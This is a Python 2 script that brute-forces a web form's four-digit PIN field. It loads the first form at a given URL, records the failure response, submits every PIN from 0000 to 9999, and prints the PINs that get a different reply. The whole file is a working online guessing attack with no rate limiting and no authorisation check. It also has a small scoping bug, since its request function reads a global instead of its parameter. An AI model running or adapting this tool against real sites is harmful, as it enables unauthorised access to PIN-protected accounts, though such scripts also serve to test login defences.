import sys, requests, itertools, os
from lxml.html import fromstring

def getAllPossibilties(charset, minlength, maxlength):
	return (''.join(candidate)
			for candidate in itertools.chain.from_iterable(
				itertools.product(charset, repeat=i)
				for i in range(minlength, maxlength + 1)
			)
		)

def sendRequest(action, method, inputs):
	# check if GET or POST
	if method == "GET":
		action += "?" 
		for i in fields:
			action += i+"="+fields[i]+"&"

		with requests.Session() as c:
			response = c.get(action)
	else :
		with requests.Session() as c:
			response = c.post(action, data=fields)

	return response

if __name__ == '__main__':

	if len(sys.argv) > 1:
		# Get the form url
		url = sys.argv[1]
		print "[+] TARGET : {0}".format(url)

		# Go to the form
		with requests.Session() as c:
			response = c.get(url)

		# status_code == 200 => everything is good
		if response.status_code == 200:
			
			# Start collecting info from site
			html = fromstring(response.content)

			form = html.forms[0]			#Fetch from

			action = form.action
			if "http" not in action:
				action = url + action

			method = form.method			#GET or POST

			# Gather inputs fields
			fields = dict(form.fields)

			# Send wrong question
			fields.update({
				"pin" : "wrong answer"
				})

			response = sendRequest(action, method, fields)

			# Get wrong answer
			wrongAnswer = response.content

			charset = "0123456789"			#The acceptable characters
			minlength = 4
			maxlength = 4
			allInputs = list(getAllPossibilties(charset, minlength, maxlength))


			# save all the correct pins
			pins = []
			pinCounter = 0

			# start bruteforcing
			for pin in allInputs:
				# we have now to send our pinS
				fields.update({
					"pin" : pin
					})

				response = sendRequest(action, method, fields)

				# we check the answer
				print "Testing pin : " + pin

				if wrongAnswer in response.content:
					print "Number of accepted pins: {0}".format(pinCounter) 
				else:
					pins.append(pin)
					pinCounter += 1
					print "Number of accepted pins: {0}".format(pinCounter) 


			print "###################################################"
			print "The accepted pins are!"
			for n in pins:
				print n
			print "###################################################"
		else :
			print "there is problem with the url: {0}".format(url)
	else :
		# sys.argv[0] is the name of the script
		# sys.argv[0] ===> bruteforce.py
		# sys.argv[1] ===> the first arg after the name of the script (eg: script.py argv1 argv2 ...)
		print "usage : {0} url".format(sys.argv[0])